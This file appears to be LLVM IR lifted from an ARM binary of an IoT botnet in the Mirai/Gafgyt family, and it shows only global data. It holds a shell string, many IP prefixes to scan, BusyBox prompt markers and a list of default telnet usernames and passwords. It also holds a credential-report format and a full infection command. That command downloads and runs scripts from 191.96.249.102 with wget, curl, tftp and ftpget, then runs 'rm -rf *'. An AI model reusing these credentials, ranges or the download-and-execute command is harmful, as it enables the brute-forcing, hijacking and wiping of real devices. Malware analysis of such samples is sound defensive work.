source_filename = "test"
target datalayout = "e-p:32:32:32-f80:32:32"

%_TYPEDEF_sigset_t = type { [1 x i32] }
%sockaddr = type { i32, [14 x i8] }
%timespec = type { i32, i32 }
%sigaction = type { void (i32)*, i32, void ()*, %_TYPEDEF_sigset_t }
%sigcontext = type { i32 }
%linux_dirent64 = type { i32 }
%pollfd = type { i32, i16, i16 }
%stat = type { i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32, i32 }

@r0 = internal unnamed_addr global i32 0
@r1 = internal unnamed_addr global i32 0
@r2 = internal unnamed_addr global i32 0
@r3 = internal unnamed_addr global i32 0
@r4 = internal unnamed_addr global i32 0
@r5 = internal unnamed_addr global i32 0
@r6 = internal unnamed_addr global i32 0
@r7 = internal unnamed_addr global i32 0
@r8 = internal unnamed_addr global i32 0
@sb = internal unnamed_addr global i32 0
@sl = internal unnamed_addr global i32 0
@fp = internal unnamed_addr global i32 0
@ip = internal unnamed_addr global i32 0
@sp = internal unnamed_addr global i32 0
@lr = internal unnamed_addr global i32 0
@cpsr_n = internal unnamed_addr global i1 false
@cpsr_z = internal unnamed_addr global i1 false
@cpsr_c = internal unnamed_addr global i1 false
@cpsr_v = internal unnamed_addr global i1 false
@0 = external global i32
@global_var_2e010.8 = global i32 0
@global_var_2e020.9 = global i32* @global_var_2e010.8
@global_var_2e014.18 = global i32 0
@global_var_130e4.22 = constant i32 -509558771
@global_var_2e474.25 = global i32 0
@global_var_2e478.26 = local_unnamed_addr global i32 0
@global_var_2e47c.27 = local_unnamed_addr global i32 0
@global_var_2e164.30 = local_unnamed_addr global i32 4095
@global_var_2e160.33 = global i32 362436
@global_var_1f500.35 = constant [7 x i8] c"(null)\00"
@global_var_32474.37 = local_unnamed_addr global i32 0
@global_var_1f508.39 = constant [8 x i8] c"/bin/sh\00"
@global_var_1f510.41 = constant [3 x i8] c"sh\00"
@global_var_1f514.43 = constant [3 x i8] c"-c\00"
@global_var_ff00.45 = constant i32 -509558771
@global_var_1f518.47 = constant i32 -1
@global_var_1f918.49 = constant [14 x i8] c"/proc/cpuinfo\00"
@global_var_1f928.51 = constant [9 x i8] c"BOGOMIPS\00"
@global_var_2e45c.55 = global i32 0
@global_var_1f934.57 = constant [5 x i8] c"PING\00"
@global_var_1f93c.59 = constant [14 x i8] c"gethostbyname\00"
@global_var_2e460.61 = global i32 0
@global_var_2e464.62 = local_unnamed_addr global i32 0
@global_var_346c0.64 = global i32 0
@global_var_1f94c.66 = constant [6 x i8] c":>%$#\00"
@global_var_1f954.74 = constant [12 x i8] c"112.5.%d.%d\00"
@global_var_1f960.76 = constant [14 x i8] c"117.165.%d.%d\00"
@global_var_1f970.78 = constant [11 x i8] c"85.3.%d.%d\00"
@global_var_1f97c.80 = constant [13 x i8] c"37.158.%d.%d\00"
@global_var_1f98c.82 = constant [11 x i8] c"95.9.%d.%d\00"
@global_var_1f998.84 = constant [13 x i8] c"41.252.%d.%d\00"
@global_var_1f9a8.86 = constant [12 x i8] c"58.71.%d.%d\00"
@global_var_1f9b4.88 = constant [13 x i8] c"104.55.%d.%d\00"
@global_var_1f9c4.90 = constant [13 x i8] c"78.186.%d.%d\00"
@global_var_1f9d4.92 = constant [13 x i8] c"78.189.%d.%d\00"
@global_var_1f9e4.94 = constant [14 x i8] c"221.120.%d.%d\00"
@global_var_1f9f4.96 = constant [11 x i8] c"88.5.%d.%d\00"
@global_var_1fa00.98 = constant [13 x i8] c"41.254.%d.%d\00"
@global_var_1fa10.100 = constant [13 x i8] c"103.20.%d.%d\00"
@global_var_1fa20.102 = constant [13 x i8] c"103.47.%d.%d\00"
@global_var_1fa30.104 = constant [13 x i8] c"103.57.%d.%d\00"
@global_var_1fa40.106 = constant [13 x i8] c"45.117.%d.%d\00"
@global_var_1fa50.108 = constant [13 x i8] c"101.51.%d.%d\00"
@global_var_1fa60.110 = constant [13 x i8] c"137.59.%d.%d\00"
@global_var_1fa70.112 = constant [11 x i8] c"1.56.%d.%d\00"
@global_var_1fa7c.114 = constant [12 x i8] c"1.188.%d.%d\00"
@global_var_1fa88.116 = constant [13 x i8] c"14.204.%d.%d\00"
@global_var_1fa98.118 = constant [11 x i8] c"27.0.%d.%d\00"
@global_var_1faa4.120 = constant [11 x i8] c"27.8.%d.%d\00"
@global_var_1fab0.122 = constant [12 x i8] c"27.50.%d.%d\00"
@global_var_1fabc.124 = constant [12 x i8] c"27.54.%d.%d\00"
@global_var_1fac8.126 = constant [12 x i8] c"27.98.%d.%d\00"
@global_var_1fad4.128 = constant [13 x i8] c"27.112.%d.%d\00"
@global_var_1fae4.130 = constant [13 x i8] c"27.192.%d.%d\00"
@global_var_1faf4.132 = constant [12 x i8] c"36.32.%d.%d\00"
@global_var_1fb00.134 = constant [13 x i8] c"36.248.%d.%d\00"
@global_var_1fb10.136 = constant [12 x i8] c"39.64.%d.%d\00"
@global_var_1fb1c.138 = constant [11 x i8] c"42.4.%d.%d\00"
@global_var_1fb28.140 = constant [12 x i8] c"42.48.%d.%d\00"
@global_var_1fb34.142 = constant [12 x i8] c"42.52.%d.%d\00"
@global_var_1fb40.144 = constant [12 x i8] c"42.56.%d.%d\00"
@global_var_1fb4c.146 = constant [12 x i8] c"42.63.%d.%d\00"
@global_var_1fb58.148 = constant [12 x i8] c"42.84.%d.%d\00"
@global_var_1fb64.150 = constant [13 x i8] c"42.176.%d.%d\00"
@global_var_1fb74.152 = constant [13 x i8] c"42.224.%d.%d\00"
@global_var_1fb84.154 = constant [13 x i8] c"43.253.%d.%d\00"
@global_var_1fb94.156 = constant [13 x i8] c"43.230.%d.%d\00"
@global_var_1fba4.158 = constant [13 x i8] c"163.53.%d.%d\00"
@global_var_1fbb4.160 = constant [13 x i8] c"62.252.%d.%d\00"
@global_var_1fbc4.162 = constant [13 x i8] c"43.245.%d.%d\00"
@global_var_1fbd4.164 = constant [13 x i8] c"62.255.%d.%d\00"
@global_var_1fbe4.166 = constant [13 x i8] c"123.25.%d.%d\00"
@global_var_1fbf4.168 = constant [13 x i8] c"103.54.%d.%d\00"
@global_var_1fc04.170 = constant [13 x i8] c"27.255.%d.%d\00"
@global_var_1fc14.172 = constant [14 x i8] c"103.204.%d.%d\00"
@global_var_1fc24.174 = constant [13 x i8] c"123.24.%d.%d\00"
@global_var_1fc34.176 = constant [14 x i8] c"113.191.%d.%d\00"
@global_var_1fc44.178 = constant [13 x i8] c"81.100.%d.%d\00"
@global_var_1fc54.180 = constant [14 x i8] c"113.188.%d.%d\00"
@global_var_1fc64.182 = constant [14 x i8] c"113.189.%d.%d\00"
@global_var_1fc74.184 = constant [13 x i8] c"94.174.%d.%d\00"
@global_var_1fc84.186 = constant [13 x i8] c"14.160.%d.%d\00"
@global_var_1fc94.188 = constant [13 x i8] c"14.161.%d.%d\00"
@global_var_1fca4.190 = constant [13 x i8] c"14.162.%d.%d\00"
@global_var_1fcb4.192 = constant [13 x i8] c"14.163.%d.%d\00"
@global_var_1fcc4.194 = constant [13 x i8] c"14.164.%d.%d\00"
@global_var_1fcd4.196 = constant [13 x i8] c"14.165.%d.%d\00"
@global_var_1fce4.198 = constant [13 x i8] c"14.166.%d.%d\00"
@global_var_1fcf4.200 = constant [13 x i8] c"14.167.%d.%d\00"
@global_var_1fd04.202 = constant [13 x i8] c"14.168.%d.%d\00"
@global_var_1fd14.204 = constant [13 x i8] c"14.169.%d.%d\00"
@global_var_1fd24.206 = constant [13 x i8] c"14.170.%d.%d\00"
@global_var_1fd34.208 = constant [13 x i8] c"14.171.%d.%d\00"
@global_var_1fd44.210 = constant [13 x i8] c"14.172.%d.%d\00"
@global_var_1fd54.212 = constant [13 x i8] c"14.173.%d.%d\00"
@global_var_1fd64.214 = constant [13 x i8] c"14.174.%d.%d\00"
@global_var_1fd74.216 = constant [13 x i8] c"14.175.%d.%d\00"
@global_var_1fd84.218 = constant [13 x i8] c"14.176.%d.%d\00"
@global_var_1fd94.221 = constant [13 x i8] c"14.177.%d.%d\00"
@global_var_1fda4.223 = constant [13 x i8] c"14.178.%d.%d\00"
@global_var_1fdb4.225 = constant [13 x i8] c"14.179.%d.%d\00"
@global_var_1fdc4.227 = constant [13 x i8] c"14.180.%d.%d\00"
@global_var_1fdd4.229 = constant [13 x i8] c"14.181.%d.%d\00"
@global_var_1fde4.231 = constant [13 x i8] c"14.182.%d.%d\00"
@global_var_1fdf4.233 = constant [13 x i8] c"14.183.%d.%d\00"
@global_var_1fe04.235 = constant [13 x i8] c"14.184.%d.%d\00"
@global_var_1fe14.237 = constant [13 x i8] c"14.185.%d.%d\00"
@global_var_1fe24.239 = constant [13 x i8] c"14.186.%d.%d\00"
@global_var_1fe34.241 = constant [13 x i8] c"14.187.%d.%d\00"
@global_var_1fe44.243 = constant [13 x i8] c"14.188.%d.%d\00"
@global_var_1fe54.245 = constant [13 x i8] c"14.189.%d.%d\00"
@global_var_1fe64.247 = constant [13 x i8] c"14.190.%d.%d\00"
@global_var_1fe74.249 = constant [13 x i8] c"14.191.%d.%d\00"
@global_var_1fe84.251 = constant [13 x i8] c"45.121.%d.%d\00"
@global_var_1fe94.253 = constant [13 x i8] c"45.120.%d.%d\00"
@global_var_1fea4.255 = constant [13 x i8] c"45.115.%d.%d\00"
@global_var_1feb4.257 = constant [13 x i8] c"43.252.%d.%d\00"
@global_var_1fec4.259 = constant [13 x i8] c"43.240.%d.%d\00"
@global_var_1fed4.261 = constant [13 x i8] c"41.174.%d.%d\00"
@global_var_1fee4.263 = constant [13 x i8] c"49.118.%d.%d\00"
@global_var_1fef4.265 = constant [13 x i8] c"78.188.%d.%d\00"
@global_var_1ff04.267 = constant [13 x i8] c"45.127.%d.%d\00"
@global_var_1ff14.269 = constant [13 x i8] c"103.30.%d.%d\00"
@global_var_1ff24.271 = constant [12 x i8] c"14.33.%d.%d\00"
@global_var_1ff30.273 = constant [13 x i8] c"123.16.%d.%d\00"
@global_var_1ff40.275 = constant [13 x i8] c"202.44.%d.%d\00"
@global_var_1ff50.277 = constant [13 x i8] c"116.93.%d.%d\00"
@global_var_1ff60.279 = constant [12 x i8] c"91.83.%d.%d\00"
@global_var_1ff6c.281 = constant [13 x i8] c"41.253.%d.%d\00"
@global_var_1ff7c.283 = constant [14 x i8] c"117.173.%d.%d\00"
@global_var_1ff8c.285 = constant [14 x i8] c"113.190.%d.%d\00"
@global_var_1ff9c.287 = constant [13 x i8] c"146.88.%d.%d\00"
@global_var_1ffac.289 = constant [14 x i8] c"112.196.%d.%d\00"
@global_var_1ffbc.291 = constant [14 x i8] c"113.178.%d.%d\00"
@global_var_1ffcc.293 = constant [13 x i8] c"112.45.%d.%d\00"
@global_var_1ffdc.295 = constant [14 x i8] c"183.223.%d.%d\00"
@global_var_1ffec.297 = constant [13 x i8] c"116.71.%d.%d\00"
@global_var_1fffc.299 = constant [13 x i8] c"103.44.%d.%d\00"
@global_var_2000c.301 = constant [14 x i8] c"110.235.%d.%d\00"
@global_var_2001c.303 = constant [14 x i8] c"124.253.%d.%d\00"
@global_var_2002c.305 = constant [14 x i8] c"211.237.%d.%d\00"
@global_var_2003c.307 = constant [14 x i8] c"117.175.%d.%d\00"
@global_var_2004c.309 = constant [13 x i8] c"178.93.%d.%d\00"
@global_var_2005c.311 = constant [12 x i8] c"111.9.%d.%d\00"
@global_var_20068.313 = constant [14 x i8] c"222.252.%d.%d\00"
@global_var_20078.315 = constant [14 x i8] c"113.174.%d.%d\00"
@global_var_20088.317 = constant [14 x i8] c"113.160.%d.%d\00"
@global_var_20098.319 = constant [14 x i8] c"113.161.%d.%d\00"
@global_var_200a8.321 = constant [14 x i8] c"113.162.%d.%d\00"
@global_var_200b8.323 = constant [14 x i8] c"113.163.%d.%d\00"
@global_var_200c8.325 = constant [14 x i8] c"113.164.%d.%d\00"
@global_var_200d8.327 = constant [14 x i8] c"113.165.%d.%d\00"
@global_var_200e8.329 = constant [14 x i8] c"113.166.%d.%d\00"
@global_var_200f8.331 = constant [14 x i8] c"113.167.%d.%d\00"
@global_var_20108.333 = constant [14 x i8] c"113.168.%d.%d\00"
@global_var_20118.335 = constant [14 x i8] c"113.169.%d.%d\00"
@global_var_20128.337 = constant [13 x i8] c"123.17.%d.%d\00"
@global_var_20138.339 = constant [13 x i8] c"123.18.%d.%d\00"
@global_var_20148.341 = constant [13 x i8] c"123.19.%d.%d\00"
@global_var_20158.343 = constant [13 x i8] c"123.20.%d.%d\00"
@global_var_20168.345 = constant [13 x i8] c"123.21.%d.%d\00"
@global_var_20178.347 = constant [13 x i8] c"123.22.%d.%d\00"
@global_var_20188.349 = constant [14 x i8] c"222.253.%d.%d\00"
@global_var_20198.351 = constant [14 x i8] c"222.254.%d.%d\00"
@global_var_201a8.353 = constant [14 x i8] c"222.255.%d.%d\00"
@global_var_201b8.355 = constant [13 x i8] c"37.247.%d.%d\00"
@global_var_201c8.357 = constant [13 x i8] c"41.208.%d.%d\00"
@global_var_201d8.359 = constant [14 x i8] c"183.220.%d.%d\00"
@global_var_201e8.361 = constant [14 x i8] c"175.201.%d.%d\00"
@global_var_201f8.363 = constant [14 x i8] c"103.198.%d.%d\00"
@global_var_20208.366 = constant [13 x i8] c"50.205.%d.%d\00"
@global_var_20218.368 = constant [13 x i8] c"88.248.%d.%d\00"
@global_var_20228.370 = constant [13 x i8] c"88.105.%d.%d\00"
@global_var_20238.372 = constant [13 x i8] c"88.247.%d.%d\00"
@global_var_20248.374 = constant [13 x i8] c"85.105.%d.%d\00"
@global_var_20258.376 = constant [12 x i8] c"188.3.%d.%d\00"
@global_var_20264.378 = constant [14 x i8] c"103.203.%d.%d\00"
@global_var_20274.380 = constant [13 x i8] c"103.55.%d.%d\00"
@global_var_20284.382 = constant [14 x i8] c"103.220.%d.%d\00"
@global_var_20294.384 = constant [14 x i8] c"183.233.%d.%d\00"
@global_var_202a4.386 = constant [14 x i8] c"103.242.%d.%d\00"
@global_var_202b4.389 = constant [13 x i8] c"103.14.%d.%d\00"
@global_var_202c4.391 = constant [14 x i8] c"103.195.%d.%d\00"
@global_var_202d4.393 = constant [14 x i8] c"103.214.%d.%d\00"
@global_var_202e4.395 = constant [14 x i8] c"103.218.%d.%d\00"
@global_var_202f4.397 = constant [14 x i8] c"103.225.%d.%d\00"
@global_var_20304.399 = constant [14 x i8] c"103.228.%d.%d\00"
@global_var_20314.401 = constant [14 x i8] c"103.231.%d.%d\00"
@global_var_20324.403 = constant [13 x i8] c"103.60.%d.%d\00"
@global_var_20334.405 = constant [14 x i8] c"103.248.%d.%d\00"
@global_var_20344.407 = constant [14 x i8] c"103.253.%d.%d\00"
@global_var_20354.409 = constant [14 x i8] c"103.255.%d.%d\00"
@global_var_20364.411 = constant [13 x i8] c"103.35.%d.%d\00"
@global_var_20374.413 = constant [13 x i8] c"103.49.%d.%d\00"
@global_var_20384.415 = constant [13 x i8] c"103.62.%d.%d\00"
@global_var_20394.417 = constant [13 x i8] c"144.48.%d.%d\00"
@global_var_203a4.419 = constant [13 x i8] c"163.47.%d.%d\00"
@global_var_203b4.422 = constant [13 x i8] c"223.29.%d.%d\00"
@global_var_203c4.424 = constant [13 x i8] c"59.153.%d.%d\00"
@global_var_203d4.426 = constant [14 x i8] c"113.176.%d.%d\00"
@global_var_203e4.428 = constant [14 x i8] c"113.175.%d.%d\00"
@global_var_203f4.430 = constant [14 x i8] c"113.177.%d.%d\00"
@global_var_20404.432 = constant [14 x i8] c"113.183.%d.%d\00"
@global_var_20414.434 = constant [14 x i8] c"202.164.%d.%d\00"
@global_var_20424.436 = constant [14 x i8] c"203.134.%d.%d\00"
@global_var_20434.438 = constant [13 x i8] c"210.56.%d.%d\00"
@global_var_20444.440 = constant [13 x i8] c"49.156.%d.%d\00"
@global_var_20454.442 = constant [14 x i8] c"203.210.%d.%d\00"
@global_var_20464.444 = constant [14 x i8] c"117.181.%d.%d\00"
@global_var_20474.446 = constant [14 x i8] c"117.178.%d.%d\00"
@global_var_20484.448 = constant [14 x i8] c"117.177.%d.%d\00"
@global_var_20494.450 = constant [14 x i8] c"117.176.%d.%d\00"
@global_var_204a4.452 = constant [14 x i8] c"117.170.%d.%d\00"
@global_var_204b4.454 = constant [14 x i8] c"117.171.%d.%d\00"
@global_var_204c4.456 = constant [14 x i8] c"117.162.%d.%d\00"
@global_var_204d4.458 = constant [13 x i8] c"112.26.%d.%d\00"
@global_var_204e4.460 = constant [13 x i8] c"112.27.%d.%d\00"
@global_var_204f4.462 = constant [13 x i8] c"112.28.%d.%d\00"
@global_var_20504.464 = constant [13 x i8] c"112.29.%d.%d\00"
@global_var_20514.466 = constant [13 x i8] c"112.30.%d.%d\00"
@global_var_20524.468 = constant [13 x i8] c"112.31.%d.%d\00"
@global_var_20534.470 = constant [14 x i8] c"203.150.%d.%d\00"
@global_var_2e168.474 = global i32 110
@global_var_20554.477 = constant [12 x i8] c"%d.%d.%d.%d\00"
@global_var_346b4.479 = global i32 0
@global_var_1f4ec.481 = constant [8 x i8] c"BusyBox\00"
@global_var_1f4f4.482 = constant i32 603979776
@global_var_1f4f8.483 = constant i32 587202560
@global_var_1f4fc.484 = constant [3 x i8] c"~#\00"
@global_var_2e118.485 = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f4ec.481, i32 0, i32 0), i8* bitcast (i32* @global_var_1f4f4.482 to i8*), i8* bitcast (i32* @global_var_1f4f8.483 to i8*), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_1f4fc.484, i32 0, i32 0)]
@global_var_1f4b4.487 = constant [7 x i8] c"nvalid\00"
@global_var_1f4bc.488 = constant [6 x i8] c"ailed\00"
@global_var_1f4c4.489 = constant [9 x i8] c"ncorrect\00"
@global_var_1f4d0.490 = constant [6 x i8] c"enied\00"
@global_var_1f4d8.491 = constant [5 x i8] c"rror\00"
@global_var_1f4e0.492 = constant [7 x i8] c"oodbye\00"
@global_var_1f4e8.493 = constant [4 x i8] c"bad\00"
@global_var_2e0f8.494 = global [7 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f4b4.487, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f4bc.488, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f4c4.489, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f4d0.490, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f4d8.491, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f4e0.492, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f4e8.493, i32 0, i32 0)]
@global_var_2e0e4 = external global i32
@global_var_1f12c.501 = constant [7 x i8] c"666666\00"
@global_var_1f134.502 = constant [8 x i8] c"support\00"
@global_var_1f140.503 = constant [8 x i8] c"default\00"
@global_var_1f14c.504 = constant [5 x i8] c"root\00"
@global_var_1f154.505 = constant [6 x i8] c"admin\00"
@global_var_1f15c.506 = constant [11 x i8] c"supervisor\00"
@global_var_1f168.507 = constant [5 x i8] c"ubnt\00"
@global_var_1f170.508 = constant i32 0
@global_var_1f174.509 = constant [5 x i8] c"1234\00"
@global_var_1f17c.510 = constant [7 x i8] c"123456\00"
@global_var_1f184.511 = constant [5 x i8] c"vnpt\00"
@global_var_1f18c.512 = constant [11 x i8] c"1234567890\00"
@global_var_1f198.513 = constant [7 x i8] c"antslq\00"
@global_var_1f1a0.514 = constant [9 x i8] c"zyad1234\00"
@global_var_1f1ac.515 = constant [5 x i8] c"anko\00"
@global_var_1f1b4.516 = constant [5 x i8] c"tini\00"
@global_var_1f1bc.517 = constant [8 x i8] c"letacla\00"
@global_var_1f1c8.518 = constant [4 x i8] c"5up\00"
@global_var_1f1d0.519 = constant [7 x i8] c"xc3511\00"
@global_var_1f1d8.520 = constant [703 x i8] c"cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \0D\0A\00"
@global_var_2e030.521 = global [45 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f12c.501, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f134.502, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f140.503, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f14c.504, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f14c.504, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f154.505, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f14c.504, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f154.505, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f14c.504, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f154.505, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f154.505, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f14c.504, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f134.502, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f14c.504, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f15c.506, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f14c.504, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f14c.504, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f14c.504, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f15c.506, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f168.507, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f14c.504, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f14c.504, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f12c.501, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f134.502, i32 0, i32 0), i8* bitcast (i32* @global_var_1f170.508 to i8*), i8* bitcast (i32* @global_var_1f170.508 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f14c.504, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f154.505, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f174.509, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f14c.504, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f17c.510, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f174.509, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f184.511, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f18c.512, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f134.502, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f198.513, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f1a0.514, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f1ac.515, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f1b4.516, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f1bc.517, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f15c.506, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f168.507, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f1c8.518, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f1d0.519, i32 0, i32 0), i8* getelementptr inbounds ([703 x i8], [703 x i8]* @global_var_1f1d8.520, i32 0, i32 0)]
@global_var_20560.523 = constant [3 x i8] c"\0D\0A\00"
@global_var_2e088.525 = global [23 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f12c.501, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f134.502, i32 0, i32 0), i8* bitcast (i32* @global_var_1f170.508 to i8*), i8* bitcast (i32* @global_var_1f170.508 to i8*), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f14c.504, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f154.505, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f174.509, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f14c.504, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f17c.510, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f174.509, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f184.511, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f18c.512, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f134.502, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f198.513, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f1a0.514, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f1ac.515, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f1b4.516, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f1bc.517, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1f15c.506, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f168.507, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f1c8.518, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f1d0.519, i32 0, i32 0), i8* getelementptr inbounds ([703 x i8], [703 x i8]* @global_var_1f1d8.520, i32 0, i32 0)]
@global_var_2e12c.527 = global [10 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f4b4.487, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f4bc.488, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @global_var_1f4c4.489, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_1f4d0.490, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_1f4d8.491, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @global_var_1f4e0.492, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_1f4e8.493, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @global_var_1f4ec.481, i32 0, i32 0), i8* bitcast (i32* @global_var_1f4f4.482 to i8*), i8* bitcast (i32* @global_var_1f4f8.483 to i8*)]
@global_var_20564.530 = constant i32 458960955
@global_var_205d0.532 = constant [16 x i8] c"REPORT %s:%s:%s\00"
@global_var_2e0e0.534 = local_unnamed_addr global [703 x i8]* @global_var_1f1d8.520
@global_var_d0a5.535 = constant i32 1392557594
@global_var_205e0.537 = constant [711 x i8] c"%s cd /tmp || cd /var/run || cd /mnt || cd /root || cd / || busybox cd /tmp || busybox cd /var/run || busybox cd /mnt || busybox cd /root || busybox cd / || /bin/busybox cd /tmp || /bin/busybox cd /var/run || /bin/busybox cd /mnt || /bin/busybox cd /root || /bin/busybox cd /; wget http://191.96.249.102/bitch.sh || curl http://191.96.249.102/bitch.sh ; chmod 777 bitch.sh; sh bitch.sh; tftp 191.96.249.102 -c get voidtftp.sh; chmod 777 voidtftp.sh; sh voidtftp.sh; tftp -r voidtftp2.sh -g 191.96.249.102; chmod 777 voidtftp2.sh; sh voidtftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 191.96.249.102 voidftp.sh voidftp.sh; sh voidftp.sh; rm -rf bitch.sh voidtftp.sh voidtftp2.sh voidftp.sh; rm -rf * \0D\0A x00\00"
@global_var_208a8.539 = constant [3 x i8] c"AA\00"
